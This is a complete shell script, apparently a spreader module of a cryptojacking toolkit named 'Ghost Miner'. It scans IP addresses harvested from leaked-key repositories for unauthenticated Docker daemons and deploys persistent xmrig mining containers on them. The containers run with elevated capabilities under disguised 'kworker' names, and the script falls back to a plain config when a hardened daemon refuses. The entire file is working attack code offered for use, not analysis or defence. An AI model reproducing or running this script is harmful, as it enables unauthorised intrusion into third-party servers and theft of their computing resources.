#!/bin/sh
# ============================================================================
# Ghost Miner docker spreader - the one vector that needs NO credentials.
#
# An exposed daemon on :2375 (or TLS :2376) needs no key, no username and no
# (key,user,host) pairing - you just POST a container that mines. curl only, so
# nothing has to exist on the victim, not even the docker CLI.
#
# The container is created with RestartPolicy=always (it comes back with the
# daemon, including after a reboot), CpuShares 512 (container equivalent of our
# niceness) and a boring name.
#
# Hosts come from the hunter's own list: every IP any leaked-key repo mentioned,
# whether or not it ever answered SSH. That is the point - this reaches boxes
# the SSH path can never touch, because nothing has to match.
#
# State: .hunt/dock.seen (daemon found, never rescanned) and .hunt/dock.tried
# (scanned, nothing there - rescanned after DOCK_RETRY so a later daemon is
# still caught).
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
# Snapshot env overrides BEFORE sourcing: worker.env publishes plain assignments,
# so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
# environment > worker.env > built-in default.
E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
PORTS="${DOCK_PORTS:-2375 2376}"
SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
SEEN="$WORK/dock.seen"            # daemon found here
TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
touch "$SEEN" "$TRIED" "$OWNFILE"
NOW=$(date +%s)

[ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
[ -n "${POOL:-}" ]   || { echo "dock: POOL unset"; exit 0; }

HOSTS="$WORK/dockhosts.$$"
{ cut -f3 "$WORK/targets.txt" 2>/dev/null || :
  cut -f3 "$WORK/loot.txt" 2>/dev/null || :
  cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
    | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"

# container command line (wallet/pool/rig, same identity as the ssh payload).
# SYS_ADMIN + host IPC let xmrig apply the MSR mod and reach the host's hugepage
# pool, otherwise it logs "HASHRATE WILL BE LOW" and loses a chunk of the speed.
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\""
case "${TLS:-true}" in
    true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
esac
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"

# a host is interesting only if a docker API answers - so verify it IS docker,
# not just an open port (and no /dev/tcp, so bash is not required either)
endpoint() {
    for p in $PORTS; do
        case "$p" in
            2375) b="http://$1:2375";  o="" ;;
            2376) b="https://$1:2376"; o="-k" ;;
            *) continue ;;
        esac
        v=$(curl -fsS $o --max-time 4 "$b/version" 2>/dev/null) || continue
        case "$v" in *ApiVersion*) printf '%s|%s\n' "$b" "$o"; return 0 ;; esac
    done
    return 1
}

dock_one() {
    ip=$1
    ep=$(endpoint "$ip") || {
        printf '%s\t%s\n' "$NOW" "$ip" >> "$TRIED"
        return 0
    }
    base=${ep%|*}
    opts=${ep#*|}

    ver=$(curl -fsS $opts --max-time 4 "$base/version" 2>/dev/null) || ver=""
    # old engines (18.06-era) emit '"Version": "x"' WITH a space; a strict grep
    # silently returned an empty version and, worse, an empty ApiVersion - which
    # sent every later call down the unversioned path they do not route.
    vs=$(printf '%s' "$ver" | grep -o '"Version": *"[^"]*"' | head -1 | cut -d'"' -f4)
    # Speak /v<ApiVersion>/... like a real client. Not cosmetic: old engines and
    # api proxies answer "page not found" to *unversioned dynamic* paths such as
    # /containers/<id>/json or /containers/<id>/start, while the static
    # /containers/json and /version keep working - which is precisely how
    # "created but start failed" was born (create is static, start is not).
    vapi=$(printf '%s' "$ver" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
    b="$base"
    [ -n "$vapi" ] && b="$base/v$vapi"
    printf '%s\n' "$ip" >> "$SEEN"
    echo "dock: daemon $ip  $base  docker=${vs:-?} api=${vapi:-?}"

    # if this daemon is the very box we are running on, the ssh payload already
    # mines here - a second xmrig would just buy a second randomx dataset. Only
    # an existing container of ours is worth touching (handled above).
    if [ "$SKIPSELF" = yes ]; then
        me=$(hostname 2>/dev/null) || me=""
        nm=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
             | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
            echo "dock: $ip is this host (payload mines here already)"
            return 0
        fi
    fi

    # ONE list call tells us what is already here. Name-based /containers/<n>/json
    # 404s on a chunk of the population (old engines, api proxies - "page not
    # found"), so a name always *looked* free and the container was created blind;
    # the start by name then 404s too. So: read the list, and take the id from
    # create's response instead of spelling it by name.
    lst=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    if [ -z "$lst" ] && [ "$b" != "$base" ]; then
        # this front routes only the bare spelling - pin that for every call that
        # follows rather than keep guessing
        lst=$(curl -sS $opts --max-time 6 "$base/containers/json?all=1" 2>/dev/null) || lst=""
        [ -n "$lst" ] && b="$base"
    fi
    # docker 18.06 writes '"Id": "x"' with a space; normalise once so the awk
    # below (and the name-taken test) can trust a single spelling.
    lst=$(printf '%s' "$lst" | sed 's/": /":/g')
    have=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
        { n = split($0, a, "\"Id\":\"")
          for (i = 2; i <= n; i++)
              if (index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
    if [ -n "$have" ]; then
        up=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
            { n = split($0, a, "\"Id\":\"")
              for (i = 2; i <= n; i++)
                  if (index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
        if [ "$up" = up ]; then
            echo "dock: $ip already runs ours ($have)"
        else
            curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
            echo "dock: $ip started our existing container ($have)"
        fi
        printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
        return 0
    fi

    # pick a free boring name; "taken" means the list mentions it
    name=""
    for n in kworker kworker1 kworker2 kworker3; do
        case "$lst" in
            *"\"/$n\""*) continue ;;   # someone else's container holds that name
        esac
        name=$n
        break
    done
    [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }

    # pull only if the image is not already there (their bandwidth)
    if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
        echo "dock: $ip pulling $IMAGE"
        curl -sS $opts --max-time 300 -X POST \
             "$b/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
    fi

    # NOTE the -f on the create/start checks: without it a 404 body
    # ({"message":"page not found"}) still exits 0 and a failed start is
    # recorded as a deploy.
    if r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                -H "Content-Type: application/json" -d "$BODY" 2>/dev/null); then
        id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
        cid=${id:-$name}
        if curl -fsS $opts --max-time 25 -X POST \
                "$b/containers/$cid/start" >/dev/null 2>&1; then
            printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
            echo "dock: DEPLOYED $name -> $ip (restart=always)"
        else
            # a second attempt as boring as possible: SYS_ADMIN, host ipc and
            # cpu shares are all things a hardened daemon can refuse at start.
            echo "dock: $ip refused $name, retrying plain"
            curl -sS $opts --max-time 20 -X DELETE \
                 "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS]"
            body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
            if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                          -H "Content-Type: application/json" -d "$body_min" 2>/dev/null); then
                id2=$(printf '%s' "$r2" | grep -oE '[0-9a-f]{64}' | head -1)
                if curl -fsS $opts --max-time 25 -X POST \
                        "$b/containers/${id2:-$name}/start" >/dev/null 2>&1; then
                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
                    echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
                else
                    echo "dock: start failed even plain on $ip"
                fi
            else
                echo "dock: recreate failed on $ip"
            fi
        fi
    else
        echo "dock: create failed on $ip"
    fi
}

queued=$(wc -l < "$HOSTS")
echo "dock: $queued hosts in queue, cap $MAX, parallel $PAR"
n=0
while read -r ip; do
    [ -n "$ip" ] || continue
    grep -qxF "$ip" "$SEEN" 2>/dev/null && continue
    if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
            '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
        continue
    fi
    n=$((n + 1))
    if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; break; fi
    dock_one "$ip" &
    if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
done < "$HOSTS"
wait || true
rm -f "$HOSTS"
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), containers placed $(wc -l < "$OWNFILE")"

